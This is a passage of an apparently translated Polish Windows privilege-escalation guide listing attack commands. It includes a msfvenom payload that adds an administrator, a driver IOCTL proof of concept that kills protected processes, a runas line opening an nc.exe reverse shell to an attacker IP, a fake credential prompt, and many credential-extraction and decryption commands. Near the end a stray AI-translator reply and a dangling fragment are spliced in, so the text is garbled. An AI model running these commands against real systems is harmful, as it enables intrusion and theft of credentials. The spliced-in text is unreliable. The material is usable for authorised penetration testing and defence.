wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Możesz wykryć i wykorzystać** tę podatność za pomocą metasploit: `exploit/windows/local/trusted\_service\_path` Możesz ręcznie utworzyć plik binarny usługi za pomocą metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Akcje odzyskiwania

Windows pozwala użytkownikom określić działania, które mają być wykonane w przypadku awarii usługi. Funkcję tę można skonfigurować tak, aby wskazywała na binary. Jeśli ten binary można podmienić, możliwa jest privilege escalation. Więcej informacji znajdziesz w [oficjalnej dokumentacji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Aplikacje

### Zainstalowane aplikacje

Sprawdź **uprawnienia dla binaries** (może uda ci się overwrite jednego i escalate privileges) oraz **folderów** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Uprawnienia zapisu

Sprawdź, czy możesz zmodyfikować jakiś plik konfiguracyjny, aby odczytać jakiś specjalny plik, lub czy możesz zmodyfikować jakiś plik binarny, który zostanie wykonany przez konto Administratora (schedtasks).

Sposobem na znalezienie słabych uprawnień do folderów/plików w systemie jest wykonanie:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload — utrwalanie/wykonanie

Notepad++ automatycznie ładuje każdą bibliotekę plugin DLL z podfolderów `plugins`. Jeśli dostępna jest zapisywalna przenośna/kopiowana instalacja, upuszczenie złośliwego pluginu powoduje automatyczne wykonanie kodu w procesie `notepad++.exe` przy każdym uruchomieniu (w tym z `DllMain` i callbacków pluginu).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Uruchamianie przy starcie

**Sprawdź, czy możesz nadpisać jakiś klucz rejestru lub binarkę, która zostanie uruchomiona przez innego użytkownika.**\
**Przeczytaj** **następującą stronę**, aby dowiedzieć się więcej o interesujących **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sterowniki

Szukaj możliwych **dziwnych/wrażliwych sterowników firm trzecich**
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Jeśli driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), możesz eskalować, kradnąc token SYSTEM bezpośrednio z pamięci jądra. Zobacz technikę krok‑po‑kroku tutaj:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Dla race-condition bugs, gdzie podatne wywołanie otwiera attacker-controlled Object Manager path, celowe spowolnienie lookupu (używając max-length components lub głębokich łańcuchów katalogów) może wydłużyć okno z mikrosekund do dziesiątek mikrosekund:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Nowoczesne hive vulnerabilities pozwalają przygotować deterministyczne układy, wykorzystać zapisywalne potomki HKLM/HKU i przekształcić uszkodzenie metadanych w kernel paged-pool overflows bez custom drivera. Poznaj pełny łańcuch tutaj:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Niektóre signed third‑party drivers tworzą swój device object z silnym SDDL za pomocą IoCreateDeviceSecure, ale zapominają ustawić FILE_DEVICE_SECURE_OPEN w DeviceCharacteristics. Bez tego flag, secure DACL nie jest egzekwowany, gdy device zostanie otwarty przez ścieżkę zawierającą dodatkowy komponent, co pozwala dowolnemu unprivileged userowi uzyskać handle, używając namespace path takiej jak:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

Gdy użytkownik może otworzyć device, uprzywilejowane IOCTLs udostępniane przez drivera mogą być nadużyte do LPE i tampering. Przykładowe możliwości obserwowane w terenie:
- Zwrócenie full-access handles do dowolnych procesów (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Niekontrolowany raw disk read/write (offline tampering, triki utrzymania trwałości przy starcie systemu).
- Terminacja dowolnych procesów, w tym Protected Process/Light (PP/PPL), pozwalając na AV/EDR kill z poziomu user land via kernel.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Zabezpieczenia dla deweloperów
- Zawsze ustaw FILE_DEVICE_SECURE_OPEN przy tworzeniu device objects, które mają być ograniczone przez DACL.
- Weryfikuj kontekst wywołującego dla operacji uprzywilejowanych. Dodaj PP/PPL checks przed zezwoleniem na zakończenie procesu lub zwrotem uchwytów.
- Ogranicz IOCTLs (access masks, METHOD_*, walidacja danych wejściowych) i rozważ modele pośredniczące zamiast bezpośrednich uprawnień jądra.

Wskazówki wykrywania dla obrońców
- Monitoruj otwarcia w user-mode podejrzanych nazw urządzeń (e.g., \\ .\\amsdk*) oraz specyficzne sekwencje IOCTL wskazujące na nadużycie.
- Wymuś stosowanie Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) i utrzymuj własne allow/deny lists.


## PATH DLL Hijacking

If you have **write permissions inside a folder present on PATH** you could be able to hijack a DLL loaded by a process and **escalate privileges**.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Aby uzyskać więcej informacji o tym, jak wykorzystać tę kontrolę:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Sieć

### Udostępnienia
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Sprawdź, czy w hosts file nie ma innych znanych komputerów wpisanych na stałe.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Interfejsy sieciowe i DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

Sprawdź **usługi o ograniczonym dostępie** z zewnątrz
```bash
netstat -ano #Opened ports?
```
### Tabela routingu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Tabela ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Reguły Firewall

[**Zobacz tę stronę, aby znaleźć polecenia związane z Firewall**](../basic-cmd-for-pentesters.md#firewall) **(lista reguł, tworzenie reguł, wyłączanie...)**

Więcej[ poleceń do enumeracji sieci tutaj](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Plik binarny `bash.exe` można również znaleźć w `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Jeśli uzyskasz root user, możesz nasłuchiwać na dowolnym porcie (przy pierwszym użyciu `nc.exe` do nasłuchiwania system przez GUI zapyta, czy zezwolić `nc` na dostęp przez firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Aby łatwo uruchomić bash jako root, możesz spróbować `--default-user root`

Możesz przeglądać system plików `WSL` w folderze `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Poświadczenia Windows

### Poświadczenia Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Menedżer poświadczeń / Windows Vault

Z [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
Windows Vault przechowuje poświadczenia użytkownika dla serwerów, stron WWW i innych programów, do których **Windows** może **zalogować użytkowników automatycznie**. Na pierwszy rzut oka może to wyglądać, jakby użytkownicy mogli zapisywać swoje dane Facebook, Twitter, Gmail itd., aby automatycznie logować się przez przeglądarki. Jednak tak nie jest.

Windows Vault przechowuje poświadczenia, których Windows może użyć do automatycznego logowania użytkowników, co oznacza, że każda **aplikacja Windows, która potrzebuje poświadczeń do uzyskania dostępu do zasobu** (serwer lub strona WWW) **może skorzystać z tego Credential Manager** & Windows Vault i użyć zapisanych poświadczeń zamiast ciągłego wpisywania przez użytkowników nazwy i hasła.

Jeśli aplikacje nie komunikują się z Credential Manager, nie sądzę, aby mogły użyć poświadczeń dla danego zasobu. Dlatego, jeśli twoja aplikacja chce korzystać z vault, powinna w jakiś sposób **nawiązać komunikację z credential manager i zażądać poświadczeń dla tego zasobu** z domyślnego magazynu.

Użyj `cmdkey`, aby wyświetlić zapisane poświadczenia na maszynie.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Następnie możesz użyć `runas` z opcją `/savecred`, aby skorzystać z zapisanych poświadczeń. Poniższy przykład wywołuje zdalny plik wykonywalny za pomocą udziału SMB.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Używanie `runas` z podanym zestawem poświadczeń.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Zauważ, że mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), lub moduł [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)** dostarcza metodę symetrycznego szyfrowania danych, używaną przede wszystkim w systemie Windows do symetrycznego szyfrowania prywatnych kluczy asymetrycznych. To szyfrowanie wykorzystuje sekret użytkownika lub systemu, który znacząco zwiększa entropię.

**DPAPI umożliwia szyfrowanie kluczy za pomocą klucza symetrycznego wyprowadzanego z sekretów logowania użytkownika**. W scenariuszach szyfrowania systemowego wykorzystuje sekrety uwierzytelniania domeny systemu.

Zaszyfrowane klucze RSA użytkownika, przy użyciu DPAPI, są przechowywane w katalogu %APPDATA%\Microsoft\Protect\{SID}, gdzie {SID} reprezentuje użytkownika [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier). **Klucz DPAPI, współlokowany z kluczem głównym, który zabezpiecza prywatne klucze użytkownika w tym samym pliku**, zwykle składa się z 64 bajtów losowych danych. (Ważne: dostęp do tego katalogu jest ograniczony, uniemożliwiając wylistowanie jego zawartości poleceniem dir w CMD, choć można je wyświetlić przez PowerShell).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Możesz użyć **mimikatz module** `dpapi::masterkey` z odpowiednimi argumentami (`/pvk` lub `/rpc`), aby to odszyfrować.

Pliki **credentials files protected by the master password** zwykle znajdują się w:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Możesz użyć **modułu mimikatz** `dpapi::cred` z odpowiednim `/masterkey`, aby odszyfrować.\
Możesz **wydobyć wiele DPAPI** **masterkeys** z **pamięci** za pomocą modułu `sekurlsa::dpapi` (jeśli masz uprawnienia root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Poświadczenia PowerShell

**Poświadczenia PowerShell** są często używane do **skryptowania** i zadań automatyzacji jako wygodny sposób przechowywania zaszyfrowanych poświadczeń. Poświadczenia są chronione przy użyciu **DPAPI**, co zwykle oznacza, że mogą być odszyfrowane tylko przez tego samego użytkownika na tym samym komputerze, na którym zostały utworzone.

Aby **odszyfrować** poświadczenia PS z pliku, który je zawiera, możesz wykonać:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Zapisane połączenia RDP

Można je znaleźć w `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
i w `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Ostatnio uruchamiane polecenia
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Menedżer poświadczeń pulpitu zdalnego**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
Możesz **wyodrębnić wiele DPAPI masterkeys** z pamięci przy użyciu modułu Mimikatz `sekurlsa::dpapi`

### Sticky Notes

Użytkownicy często korzystają z aplikacji Sticky Notes na stacjach roboczych z Windows, aby **zapisywać hasła** i inne informacje, nie zdając sobie sprawy, że jest to plik bazy danych. Ten plik znajduje się pod ścieżką `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i zawsze warto go wyszukać i przeanalizować.

### AppCmd.exe

**Uwaga, aby odzyskać hasła z AppCmd.exe musisz mieć prawa Administratora i uruchomić proces na wysokim poziomie integralności (High Integrity level).**\
**AppCmd.exe** znajduje się w katalogu `%systemroot%\system32\inetsrv\`.\  
Jeśli ten plik istnieje to możliwe, że jakieś **credentials** zostały skonfigurowane i mogą zostać **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Sprawdź, czy `C:\Windows\CCM\SCClient.exe` exists .\
Instalatory są uruchamiane z **SYSTEM privileges**, wiele jest podatnych na **DLL Sideloading (Informacje z** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Pliki i Rejestr (Poświadczenia)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Klucze SSH w rejestrze

Prywatne klucze SSH mogą być przechowywane w kluczu rejestru `HKCU\Software\OpenSSH\Agent\Keys`, więc warto sprawdzić, czy znajduje się tam coś interesującego:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Jeśli znajdziesz jakiś wpis w tej ścieżce, prawdopodobnie będzie to zapisany klucz SSH. Jest przechowywany zaszyfrowany, ale można go łatwo odszyfrować za pomocą [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Więcej informacji o tej technice tutaj: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Jeśli usługa `ssh-agent` nie działa i chcesz, aby uruchamiała się automatycznie przy starcie systemu, uruchom:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Wygląda na to, że ta technika nie jest już aktualna. Próbowałem stworzyć kilka ssh keys, dodać je za pomocą `ssh-add` i zalogować się przez ssh na maszynę. Rejestr HKCU\Software\OpenSSH\Agent\Keys nie istnieje, a procmon nie wykrył użycia `dpapi.dll` podczas uwierzytelniania kluczem asymetrycznym.

### Pliki bez nadzoru
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Możesz również wyszukać te pliki za pomocą **metasploit**: _post/windows/gather/enum_unattend_

Przykładowa zawartość:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Kopie zapasowe SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Poświadczenia chmurowe
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Szukaj pliku o nazwie **SiteList.xml**

### Cached GPP Pasword

Kiedyś dostępna była funkcja pozwalająca na wdrażanie niestandardowych kont lokalnych administratorów na grupie maszyn za pomocą Group Policy Preferences (GPP). Jednak ta metoda miała poważne luki bezpieczeństwa. Po pierwsze, Group Policy Objects (GPOs), przechowywane jako pliki XML w SYSVOL, mogły być dostępne dla dowolnego użytkownika domeny. Po drugie, hasła zawarte w tych GPP, zaszyfrowane przy użyciu AES256 z publicznie udokumentowanym domyślnym kluczem, mogły zostać odszyfrowane przez dowolnego uwierzytelnionego użytkownika. Stanowiło to poważne ryzyko, ponieważ mogło pozwolić użytkownikom na uzyskanie podwyższonych uprawnień.

Aby złagodzić to ryzyko, opracowano funkcję, która skanuje lokalnie zbuforowane pliki GPP zawierające pole "cpassword", które nie jest puste. Po znalezieniu takiego pliku funkcja odszyfrowuje hasło i zwraca niestandardowy obiekt PowerShell. Obiekt ten zawiera informacje o GPP i lokalizacji pliku, co ułatwia identyfikację i usunięcie tej luki bezpieczeństwa.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (przed Windows Vista)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Aby odszyfrować cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Użycie crackmapexec do pobrania passwords:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS — plik web.config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Przykład web.config z poświadczeniami:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Poświadczenia OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logi
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Poproś o credentials

Zawsze możesz **poprosić użytkownika, aby wpisał jego credentials lub nawet credentials innego użytkownika** jeśli uważasz, że może je znać (zauważ, że **poproszenie** klienta bezpośrednio o **credentials** jest naprawdę **ryzykowne**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Możliwe nazwy plików zawierających poświadczenia**

Znane pliki, które jakiś czas temu zawierały **hasła** w **czystym tekście** lub **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have access to your files. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (or the other files you want translated) here, and I will translate the relevant English text to Polish while preserving all markdown/html tags, links and paths as requested.
```
cd C:\
